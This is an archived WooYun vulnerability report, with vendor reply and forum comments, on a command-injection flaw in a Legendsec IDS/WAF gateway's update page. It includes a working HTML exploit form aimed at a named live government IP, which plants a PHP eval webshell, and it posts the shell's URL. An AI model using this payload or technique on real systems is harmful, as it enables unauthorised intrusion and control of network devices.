{"id": 9316, "wybug_id": "wooyun-2013-027324", "wybug_title": "[再浅谈内网安全]--网神某带ids,waf网关设备完控0day又一枚", "wybug_corp": "网神", "wybug_author": "紫梦芊", "wybug_date": "2013-07-01 11:51", "wybug_open_date": "2013-09-29 11:51", "wybug_type": "设计不当", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行", "硬件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-29：\t细节向公众公开  简要描述： 之前发布的国内外VPN网关0day包括了网神 现在再爆他们带ids和waf版本远程命令执行的0day一枚问题很普通。 详细说明：  话不多说直接上0day.\n<form action=\"https://221.202.118.50/admin/ids/waf_update.php\" method=\"post\"><input type=\"hidden\" name=\"uptype\" value=\"1\"><input type=\"hidden\" name=\"sys_path\" value=\"http://update.cisco.com/tmp.bin -O /data/upload/__ids_up__.bin || echo '<? eval($_POST[cmd])?>' >/ssl/www/bug2.php ||whoami \"><input type=\"submit\" name=\"Submit\"></form>\n221.202.118.50 是葫芦岛市绩效考核系统 这个应该是网神VPN最新版本 感觉用户体验还不赖来看看问题出在哪儿\ninclude_once \"management/system.php\";include_once \"management/ids.php\";$uptype =1;if ($_FILES['ids_file'] || isset($_POST[\"sys_path\"])) {\t$uptype = $_POST[\"uptype\"];\tif($_POST[\"uptype\"] == 2){\t\t$file_size = $_FILES['ids_file']['size'];\t\t$file_type = $_FILES['ids_file']['type'];\t\t\t$temp_name = $_FILES['ids_file']['tmp_name'];\t\t$file_name = $_FILES['ids_file']['name'];\t\t$file_name = str_replace(\"\\\\\",\"\",$file_name);\t\t$file_name = str_replace(\"'\",\"\",$file_name);\t\t$file_name = str_replace(\" \",\"\",$file_name);\t\t$file_path = $CFG_UPLOAD_PATH.\"__ids_up__.bin\";\t\t//File Name Check\t\tif ( $file_name == \"\" ) { \t\t\techo \"Invalid File Name Specified\";\t\t\treturn;\t\t}\t\t$result = move_uploaded_file($temp_name, $file_path);\t}else{\t\t$file_path = \"/data/upload/__ids_up__.bin\";\t\t$url = trim($_POST[\"sys_path\"]);\t\t$url =\"http://\".$url;\t\tsystem(\"wget -t 3 $url -O $file_path \");\t\t}\t$SM = new IDSManager;\t$V = $SM->snort_update($ticket,$file_path);}\n看代码可以看出是能从web上传 也可以从sys_path参数获取到的地址下载 然后进行snort的升级用system(wget)进行的下载 进行升级钱应该有个ticket判断 这个相当于session或token 还有一要素 management/system.php 和 management/ids.php 是没有在当前目录下的 所以执行0day后出现如此\n\n看到这个Fatal error 很多人瞬间放弃 也许他们测试也测过这里 但是 我们的system在31行之前,无影响(这就是脚本语言的好处之一,运维可以说是噩梦之一,呵呵) 菜刀一连\n\n还有些泄漏的源码 看来应该不大重要 但是不应该放在web目录下\n\n   漏洞证明：  https://221.202.118.50/bug2.php   cmd\n\n葫芦岛市的用户不少 我在这里抛个砖,引点大家的玉\n\n这个...完全只防了正规途径啊..\n\n这个...依然\n\n这个NAT配置是个很方便的东西 方便对iptables不熟悉的朋友进行内网渗透PS:其实当前有不少数SOC以及IDS等防御方式不够完善,大多只对正规途径来的用户行为进行了审计防范,一些另类的方式或是不常用的方式并不审计,或审计较弱,还有普遍现象是大量无用信息没有归纳挖掘,网络管理员也懒得看了。   修复方案：  找乌云官方进行乌云众测(PS:你们竞争对手sinfor也做了众测)   版权声明：转载请注明来源 紫梦芊@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2013-07-05 00:04 厂商回复： CNVD确认并复现所述情况，同时对于该设备进行分析后，检测发现若干暴露在互联网上的实例，可以初步确认通用性。拟由CNCERT直接联系厂商处置，同时将继续检测互联网上可能涉及政府和重要信息系统部门的事件，后续加强处置。rank 17 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-01 11:52 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  跪倒    \n     2013-07-01 12:02 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  0day    \n     2013-07-01 12:16 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  厉害呀！    \n     2013-07-01 12:33 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  流弊呀    \n     2013-07-01 12:48 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  mark    \n     2013-07-01 13:16 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  流弊    \n     2013-07-01 13:19 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  流弊    \n     2013-07-01 13:36 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  流弊 mark 厉害呀！    \n     2013-07-01 14:18 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  看一楼明真相的群众节奏带起来了，果断关注啊！    \n     2013-07-01 14:19 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  妹子威武    \n     2013-07-01 14:47 |    \t\tO.o \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:12        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  流弊    \n     2013-07-01 14:49 |    \t\t0x2b \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:12        )\t\t \n  流弊    \n     2013-07-01 15:44 |    \t\t0x334 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:35        | 漏洞无影响，已忽略～～～～～～～)\t\t \n  跪躺～    \n     2013-07-01 23:39 |    \t\t好人 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:6        | 多少人曾爱慕你年轻的容颜)\t\t \n  xxoo    \n     2013-07-01 23:53 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  开源、闭源，源码审计是王道。     \n     2013-07-02 08:07 |    \t\t菜菜菜菜 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 无)\t\t \n  org霸道    \n     2013-07-03 11:30 |    \t\t夜不眠 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 早睡早起,方能养生啊)\t\t \n  还没确认?看来会提前公开了，咩嘿嘿嘿~    \n     2013-07-10 12:11 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  @se55i0n @gainover 是个小问题 只是修复方案独特 各位大牛见笑了.    \n     2013-08-10 00:24 |    \t\twugui \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:4        | wugui@lcx.cc)\t\t \n  咩嘿嘿嘿~    \n     2013-08-14 09:03 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  写的太好了！！！程序猿又偷懒了啊，file_name过滤3项，到sys_path，只除去空格~~~    \n     2013-08-14 20:18 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  大牛    \n     2013-08-18 21:10 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  妹子威武，膜拜    \n     2013-09-19 07:55 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  是妹子？膜拜  这种是怎么找到的呢    \n     2013-09-29 13:21 |    \t\t心伤的裤子 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 看啥，裤子都掉了还看！)\t\t \n  lz才是真正的网神呀    \n     2013-09-29 14:18 |    \t\txx123 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 雷锋)\t\t \n  牛逼啊，厉害厉害    \n     2013-09-29 14:47 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  看了两遍，真心觉得很赞，，，这会不会是剑心传说中的女喷油呢？    \n     2013-09-29 23:11 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  @在路上 @鬼魅羊羔 这篇没什么技术含量 只是上一篇的延续而已 找到原因是在原漏洞基础上留了进入方式 继续看新的代码实现     \n     2013-09-30 13:22 |    \t\tLee \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | wataru@eviloctal.com)\t\t \n  很多厂商的网络设备都存在很多的漏洞，洞主加油之！    \n     2013-10-03 19:36 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n  支持LZ法0DAY    \n     2014-04-15 13:27 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @紫梦芊 你的群满了啊    \n     2014-05-16 10:57 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  dz 求带……    \n     2014-06-20 01:24 |    \t\t红领巾 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 有些漏洞，如果只是从技术层面来说明问题，...)\t\t \n  居然是妹子    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}